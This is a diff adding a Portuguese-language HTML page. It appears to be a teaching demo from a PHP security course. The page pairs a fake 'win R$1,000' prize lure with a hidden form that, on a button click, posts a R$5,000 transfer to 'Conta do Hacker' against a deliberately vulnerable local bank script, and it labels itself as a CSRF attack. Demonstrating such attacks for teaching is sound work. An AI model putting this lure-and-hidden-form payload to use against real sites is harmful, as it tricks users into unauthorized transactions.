@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 GANHE R$ 1000 GRÁTIS!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 50px;
+            text-align: center;
+        }
+        .promo {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 { color: #f5576c; font-size: 36px; }
+        .btn {
+            background: #f5576c;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .warning {
+            background: #ffebee;
+            border: 2px solid #f44336;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            color: #c62828;
+        }
+    </style>
+</head>
+<body>
+    <div class="promo">
+        <h1>🎉 PARABÉNS!</h1>
+        <p style="font-size: 20px;">Você foi selecionado para ganhar <strong>R$ 1.000,00</strong>!</p>
+        <p>Clique no botão abaixo para resgatar seu prêmio:</p>
+        
+        <button class="btn" onclick="atacar()">🎁 RESGATAR AGORA</button>
+
+        <div class="warning">
+            <strong>⚠️ ATAQUE CSRF EM AÇÃO</strong>
+            <p>Esta página atacará o <strong>banco VULNERÁVEL</strong>!</p>
+            <p>O ataque será <strong>BEM-SUCEDIDO</strong> porque não há proteção CSRF.</p>
+        </div>
+    </div>
+
+    <!-- FORMULÁRIO MALICIOSO ESCONDIDO -->
+    <form id="ataque" action="http://localhost/playground-php/unlock-php-8/ch4/exemplo_vulneravel_banco.php" method="POST" style="display:none;">
+        <input type="hidden" name="destino" value="Conta do Hacker">
+        <input type="hidden" name="valor" value="5000">
+    </form>
+
+    <script>
+        function atacar() {
+            alert('🚨 ATAQUE CSRF INICIADO!\n\nTransferindo R$ 5.000 para "Conta do Hacker"...\n\nComo o site não tem proteção, o ataque será bem-sucedido!');
+            document.getElementById('ataque').submit();
+        }
+    </script>
+</body>
+</html>
